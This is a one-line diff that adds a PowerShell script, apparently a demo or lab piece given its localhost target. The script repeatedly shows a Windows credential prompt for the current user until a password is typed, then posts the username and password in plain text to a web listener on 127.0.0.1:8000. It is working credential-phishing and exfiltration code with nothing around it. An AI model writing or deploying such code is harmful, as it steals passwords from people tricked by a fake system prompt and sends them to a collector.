@@ -1,0 +1,1 @@
+while($true){$u=$env:USERNAME;$c=Get-Credential -message "Could you please enter your password here so I can hack you?" -username $u; $p=$c.GetNetworkCredential().Password; if ($p -gt 0) {break}};  iwr http://127.0.0.1:8000/ -method POST -body "$u`:$p"
